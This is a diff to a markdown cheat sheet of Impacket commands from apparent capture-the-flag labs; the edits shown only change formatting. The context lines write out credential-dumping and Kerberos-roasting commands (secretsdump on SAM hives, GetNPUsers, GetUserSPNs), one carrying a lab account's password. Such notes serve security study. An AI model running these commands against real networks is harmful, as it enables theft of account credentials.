@@ -5,7 +5,9 @@
 ```bash
 impacket-secretsdump -sam sam.bak -system system.bak LOCAL
 ```
-Used on: **Wreath** - extracted local NTLM hashes from saved SAM/SYSTEM hives.
+Used on: **Wreath**
+
+extracted local NTLM hashes from saved SAM/SYSTEM hives.
 
 ### Dump credentials from DC
 ```bash
@@ -35,7 +37,7 @@ impacket-GetNPUsers overwatch.htb/ -usersfile users.txt -dc-ip TARGET_IP -no-pas
 ```
 Used on: **Overwatch**
 
-- `-no-pass` — enumerate only accounts with "Do not require Kerberos preauth"
+`-no-pass` — enumerate only accounts with "Do not require Kerberos preauth"
 - `-format hashcat` — output in hashcat-compatible format (mode 18200)
 
 ### Kerberoasting
@@ -44,7 +46,7 @@ impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip TARGET_IP -req
 ```
 Used on: **Overwatch**
 
-- `-request` — request TGS tickets and dump them in crackable format (mode 13100)
+`-request` — request TGS tickets and dump them in crackable format (mode 13100)
 
 
 
